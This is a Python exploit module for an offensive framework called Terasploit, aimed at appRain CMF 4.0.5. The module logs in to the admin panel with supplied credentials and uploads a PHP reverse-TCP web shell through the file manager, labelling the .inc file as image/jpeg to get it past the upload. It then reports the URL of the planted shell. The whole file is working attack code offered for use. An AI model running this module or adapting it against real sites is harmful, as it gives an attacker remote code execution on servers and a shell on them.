#######
# Module/Exploit: appRain CMF Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Name'     : 'appRain CMF Authenticated Remote Code Execution',
                'Version'  : '4.0.5',
                'Module'   : Module.exploit,
                'Platform' : Platform.PHP,
                'Arch'     : Arch.PHP,
                'Payload'  : 'modules/payload/php/reverse_tcp',
                'Authors'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                    'Ahmet Ãœmit BAYRAM'
                ],
                'Description' : [
                    'appRain CMF version 4.0.5 authenticated remote code execution',
                    'vulnerability that allows attackers to upload a shell.'
                ],
                'References' : [
                    'https://www.exploit-db.com/exploits/52041'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptString.new('username',['','yes','username to use for authentication']),
            OptString.new('password',['','yes','password to use for authentication'])
        ])
        
        
    def login(self) -> bool:
        _, username, password = self.OPT()
        
        info_print ('Logging in using specified credentials...')
        login_response = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/system',
            data={'data[Admin][admin_id]' : username,'data[Admin][admin_password]':password},
            headers={'Content-Type':'application/x-www-form-urlencoded'}
        )
        return True if 'Logout' in login_response.text else False
        

    def exploit(self) -> tuple[str, bool]:
        payload, _ = Get.payload()
        target, _, _ = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f'{Target.scheme}://{Target.hostname}/uploads/filemanager/{rand}.inc')
        
        try:
            if self.login():
                exploit = HTTP.session.post(
                    url=f"https://{Target.hostname}/admin/filemanager/upload",
                    files={'data[filemanager][image]': (f"{rand}.inc", shell, 'image/jpeg')}, 
                    data={'submit':'Upload'}
                )

                if exploit.status_code in self.good_status_code():
                    info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                    return 'session', True
                else:
                    info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                    return 'session', False
            else:
                info_print("Failed to login using specified credentials")
                HTTP().new()
                return 'done', False
                
        except Exception as error:
            info_print (error,type='red')
            HTTP().new()
            return 'exception', True